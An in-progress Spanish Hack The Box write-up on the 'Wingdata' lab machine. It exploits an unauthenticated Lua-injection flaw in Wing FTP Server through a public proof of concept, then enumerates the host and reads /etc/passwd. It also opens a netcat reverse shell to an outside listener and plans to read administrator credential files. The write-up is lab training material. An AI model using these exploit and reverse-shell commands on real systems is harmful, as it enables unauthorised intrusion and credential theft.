# Wingdata — HTB (Writeup)

> **Autor:** Ángel de la Vega Cuevas
> **Objetivo:** Documentar el proceso de enumeración y explotación inicial en la máquina *Wingdata* de Hack The Box.

---

## Resumen

Durante la enumeración se identificó un servicio web asociado a **Wing FTP Server**. El servidor resultó vulnerable a **CVE-2025-47812**, una vulnerabilidad que permite ejecución remota de comandos sin autenticación mediante inyección de código Lua en archivos de sesión. La explotación permitió ejecutar comandos como el usuario `wingftp` y acceder al sistema.

> ⚠️ Writeup en progreso — máquina no completada aún.

---

## 1) Descubrimiento

* **IP objetivo (lab):** `10.129.4.4` / `ftp.wingdata.htb`
* **OS detectado:** Linux
* **Servicios detectados:** HTTP (Wing FTP Server webadmin)

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.4.4 -oG allPorts
```

> El dominio `ftp.wingdata.htb` requiere resolución manual. Añadir al `/etc/hosts`:
> ```
> 10.129.4.4   ftp.wingdata.htb wingdata.htb
> ```

---

## 2) Enumeración

Durante la enumeración web se identificó que el servidor ejecuta **Wing FTP Server**.

Investigando vulnerabilidades públicas se encontró **CVE-2025-47812**, que afecta a Wing FTP Server <= 7.4.3 y permite:

- Ejecución remota de comandos sin autenticación
- Inyección de código Lua en el parámetro `username` (NULL byte injection)
- Ejecución automática del payload al acceder a `/dir.html`

---

## 3) Explotación (CVE-2025-47812)

Se utilizó el siguiente PoC público:

```
https://github.com/AzureADTrent/CVE-2025-4517-POC-HTB-WingData
```

Preparación del entorno:

```bash
python3 -m venv venv
source venv/bin/activate
pip install requests prompt_toolkit
```

Ejecución del exploit:

```bash
python3 exploit.py -u http://ftp.wingdata.htb
```

Salida obtenida:

```
[*] Targeting http://ftp.wingdata.htb
[*] Logging in with injected payload...
[*] Triggering payload...
[+] Target is vulnerable! Command output:
uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),...
[+] Shell opened. Type 'exit' or Ctrl+C to quit.

Shell>
```

RCE confirmado como usuario `wingftp`.

---

## 4) Enumeración del sistema

Desde la `Shell>` del exploit:

```bash
id
# uid=1000(wingftp)

ls /opt/wingftp
# Data  License.txt  Log  lua  session  session_admin  webadmin  webclient  wftpserver

cat /etc/passwd
# usuarios relevantes: wingftp, wacky, root
```

Archivos de configuración encontrados:

```
/opt/wingftp/Data/
├── 1/
├── _ADMINISTRATOR/
│   ├── admins.xml      ← posibles credenciales del panel admin
│   └── settings.xml
├── bookmark_db
├── settings.xml
└── ssh_host_key
```

---

## 5) Reverse shell

La shell del exploit expira rápidamente (`session expired`), por lo que se intentó obtener una shell estable.

Listener en Kali:

```bash
nc -lvnp 4444
```

Payload ejecutado desde `Shell>`:

```bash
nc 10.10.15.55 4444 -e /bin/sh
```

Conexión recibida:

```
connect to [10.10.15.55] from (UNKNOWN) [10.129.4.4] 49738
```

---

## 6) Estado actual

| Paso | Estado |
|------|--------|
| Identificar servicio vulnerable | ✅ |
| Explotar CVE-2025-47812 | ✅ |
| RCE como `wingftp` | ✅ |
| Leer archivos de configuración | ⏳ |
| Pivotar a usuario `wacky` | ⏳ |
| Escalada a `root` | ⏳ |

---

## 7) Próximos pasos

```bash
# Leer credenciales del panel admin
cat /opt/wingftp/Data/_ADMINISTRATOR/admins.xml

# Enumerar SUID y capabilities
find / -perm -4000 -type f 2>/dev/null
/usr/sbin/getcap -r / 2>/dev/null

# Revisar usuario wacky
ls -la /home/wacky
cat /home/wacky/user.txt
```

---

## 8) Notas técnicas

- La shell del exploit es temporal — cada comando abre y cierra una sesión HTTP, lo que provoca `session expired` frecuentes.
- El payload `bash -i >& /dev/tcp/...` falla porque zsh no soporta `/dev/tcp`. Usar `nc` o `python3` como alternativa.
- `admins.xml` en Wing FTP Server suele contener hashes del administrador web, que pueden usarse para acceder al panel y ejecutar scripts Lua con más privilegios.
